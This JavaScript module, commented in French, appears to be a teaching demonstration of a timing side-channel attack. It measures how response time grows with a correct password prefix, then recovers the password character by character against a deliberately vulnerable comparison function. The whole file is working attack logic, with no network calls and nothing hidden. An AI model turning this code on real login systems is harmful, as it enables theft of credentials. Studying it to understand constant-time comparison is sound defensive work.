const { mesurerTempsExecutionRepetee } = require('./mesureTempsExecution');
const { calculerStatistiques } = require('./statistiques');
const {
  afficherResultatsCorrelation,
  afficherProgressionAttaque,
  afficherMotDePasseRetrouve,
} = require('./affichageConsole');
const {
  NOMBRE_REPETITIONS_PHASE_RAPIDE,
  NOMBRE_CANDIDATS_A_AFFINER,
} = require('./constantes');

/**
 * Fabrique des mots de passe de test : préfixe correct de 0 caractère jusqu'à la longueur complète.
 * @param {string} motDePasseReference Sert uniquement à construire les cas de corrélation.
 * @returns {Array<{ longueurPrefixeCorrect: number, motDePasseTest: string }>} Cas de test générés.
 */
function genererMotsDePasseTest(motDePasseReference) {
  const casDeTest = [];

  for (let longueur = 0; longueur <= motDePasseReference.length; longueur++) {
    casDeTest.push({
      longueurPrefixeCorrect: longueur,
      motDePasseTest: motDePasseReference.slice(0, longueur),
    });
  }

  // console.log('nb cas test:', casDeTest.length);
  return casDeTest;
}

/**
 * Mesure les temps d'exécution pour un candidat et en déduit les statistiques.
 * @param {(motDePasseSaisi: string) => boolean} fonctionVerification Comparateur vulnérable.
 * @param {string} motDePasseTest Candidat à mesurer.
 * @param {number} nombreRepetitions Mesures par candidat.
 * @returns {{ minimum: number, maximum: number, moyenne: number, mediane: number, ecartType: number }} Stats sur les temps mesurés.
 */
function mesurerStatistiquesPourMotDePasse(fonctionVerification, motDePasseTest, nombreRepetitions) {
  const mesures = mesurerTempsExecutionRepetee(
    fonctionVerification,
    nombreRepetitions,
    motDePasseTest,
  );

  return calculerStatistiques(mesures);
}

/**
 * Mesure si le temps d'exécution augmente avec la longueur du préfixe correct.
 * @param {(motDePasseSaisi: string) => boolean} fonctionVerification Comparateur vulnérable.
 * @param {string} motDePasseReference Sert à générer les cas de test.
 * @param {number} nombreRepetitions Mesures par candidat.
 * @returns {Array<{ longueurPrefixeCorrect: number, motDePasseTest: string, statistiques: { minimum: number, maximum: number, moyenne: number, mediane: number, ecartType: number } }>} Résultats par longueur de préfixe.
 */
function analyserCorrelationTemporelle(fonctionVerification, motDePasseReference, nombreRepetitions) {
  const casDeTest = genererMotsDePasseTest(motDePasseReference);
  const resultats = [];

  for (const cas of casDeTest) {
    const statistiques = mesurerStatistiquesPourMotDePasse(
      fonctionVerification,
      cas.motDePasseTest,
      nombreRepetitions,
    );

    resultats.push({
      longueurPrefixeCorrect: cas.longueurPrefixeCorrect,
      motDePasseTest: cas.motDePasseTest,
      statistiques,
    });
  }

  return resultats;
}

/**
 * Devine le caractère suivant en comparant les temps d'exécution des candidats.
 * On retient la médiane : elle encaisse mieux le bruit que la moyenne.
 * En cas d'égalité (souvent sur le dernier caractère), on départage avec la vérification finale.
 * @param {(motDePasseSaisi: string) => boolean} fonctionVerification Comparateur vulnérable.
 * @param {string} prefixeCourant Ce qu'on a déjà reconstruit.
 * @param {string} jeuCaracteres Caractères à essayer à cette position.
 * @param {number} nombreRepetitions Mesures par candidat en phase détaillée.
 * @returns {{ caractereRetrouve: string, statistiques: { minimum: number, maximum: number, moyenne: number, mediane: number, ecartType: number } }} Caractère retenu et ses stats.
 */
function determinerCaractereSuivant(fonctionVerification, prefixeCourant, jeuCaracteres, nombreRepetitions) {
  const resultatsPhaseRapide = [...jeuCaracteres].map((caractere) => {
    const candidat = prefixeCourant + caractere;
    const statistiques = mesurerStatistiquesPourMotDePasse(
      fonctionVerification,
      candidat,
      NOMBRE_REPETITIONS_PHASE_RAPIDE,
    );

    return { caractere, candidat, statistiques };
  });

  const candidatAccepteRapide = resultatsPhaseRapide.find((r) => fonctionVerification(r.candidat));

  if (candidatAccepteRapide) {
    // console.log('phase rapide a marché pour', prefixeCourant);
    return {
      caractereRetrouve: candidatAccepteRapide.caractere,
      statistiques: candidatAccepteRapide.statistiques,
    };
  }

  const candidatsAAffiner = [...resultatsPhaseRapide]
    .sort((a, b) => b.statistiques.mediane - a.statistiques.mediane)
    .slice(0, NOMBRE_CANDIDATS_A_AFFINER);

  const resultatsAffines = candidatsAAffiner.map((candidat) => ({
    ...candidat,
    statistiques: mesurerStatistiquesPourMotDePasse(
      fonctionVerification,
      candidat.candidat,
      nombreRepetitions,
    ),
  }));

  const candidatAccepte = resultatsAffines.find((r) => fonctionVerification(r.candidat));

  if (candidatAccepte) {
    return {
      caractereRetrouve: candidatAccepte.caractere,
      statistiques: candidatAccepte.statistiques,
    };
  }

  const meilleur = resultatsAffines.reduce((meilleurActuel, candidat) => (
    candidat.statistiques.mediane > meilleurActuel.statistiques.mediane ? candidat : meilleurActuel
  ));

  return {
    caractereRetrouve: meilleur.caractere,
    statistiques: meilleur.statistiques,
  };
}

/**
 * Reconstruit le mot de passe caractère par caractère via une attaque temporelle.
 * Ne lit pas le mot de passe de référence.
 * @param {(motDePasseSaisi: string) => boolean} fonctionVerification Comparateur vulnérable.
 * @param {string} jeuCaracteres Caractères possibles.
 * @param {number} longueurMaximale On s'arrête là si rien ne colle avant.
 * @param {number} nombreRepetitions Mesures par candidat en phase détaillée.
 * @returns {{ motDePasseRetrouve: string, estComplet: boolean, etapesAttaque: Array<{ position: number, caractereRetrouve: string, prefixeCourant: string, statistiques: { minimum: number, maximum: number, moyenne: number, mediane: number, ecartType: number } }> }} Résultat de l'attaque.
 */
function retrouverMotDePasseParTiming(
  fonctionVerification,
  jeuCaracteres,
  longueurMaximale,
  nombreRepetitions,
) {
  let prefixeCourant = '';
  const etapesAttaque = [];

  for (let position = 0; position < longueurMaximale; position++) {
    const { caractereRetrouve, statistiques } = determinerCaractereSuivant(
      fonctionVerification,
      prefixeCourant,
      jeuCaracteres,
      nombreRepetitions,
    );

    prefixeCourant += caractereRetrouve;

    etapesAttaque.push({
      position,
      caractereRetrouve,
      prefixeCourant,
      statistiques,
    });

    if (fonctionVerification(prefixeCourant)) {
      // console.log('trouvé complet:', prefixeCourant);
      return {
        motDePasseRetrouve: prefixeCourant,
        estComplet: true,
        etapesAttaque,
      };
    }
  }

  return {
    motDePasseRetrouve: prefixeCourant,
    estComplet: fonctionVerification(prefixeCourant),
    etapesAttaque,
  };
}

/**
 * Lance l'analyse complète : corrélation, attaque, affichage des résultats.
 * @param {(motDePasseSaisi: string) => boolean} fonctionVerification Comparateur vulnérable.
 * @param {string} motDePasseReference Utilisé seulement pour la partie corrélation.
 * @param {{ nombreRepetitionsCorrelation: number, nombreRepetitionsAttaque: number, jeuCaracteres: string, longueurMaximale: number }} options Réglages de l'analyse.
 * @returns {{ resultatsCorrelation: Array<{ longueurPrefixeCorrect: number, motDePasseTest: string, statistiques: object }>, resultatAttaque: { motDePasseRetrouve: string, estComplet: boolean, etapesAttaque: Array<object> } }} Tout ce qui a été mesuré.
 */
function executerAnalyseTemporelle(fonctionVerification, motDePasseReference, options) {
  console.log('=== Analyse temporelle de la comparaison de mot de passe ===');
  console.log(`Mesures par candidat (corrélation) : ${options.nombreRepetitionsCorrelation}`);
  console.log(`Mesures par candidat (attaque)     : ${options.nombreRepetitionsAttaque}`);

  const resultatsCorrelation = analyserCorrelationTemporelle(
    fonctionVerification,
    motDePasseReference,
    options.nombreRepetitionsCorrelation,
  );

  afficherResultatsCorrelation(resultatsCorrelation);

  const resultatAttaque = retrouverMotDePasseParTiming(
    fonctionVerification,
    options.jeuCaracteres,
    options.longueurMaximale,
    options.nombreRepetitionsAttaque,
  );

  afficherProgressionAttaque(resultatAttaque.etapesAttaque);
  afficherMotDePasseRetrouve(resultatAttaque.motDePasseRetrouve, resultatAttaque.estComplet);

  // console.log('analyse terminée');
  return {
    resultatsCorrelation,
    resultatAttaque,
  };
}

module.exports = {
  genererMotsDePasseTest,
  analyserCorrelationTemporelle,
  retrouverMotDePasseParTiming,
  executerAnalyseTemporelle,
};
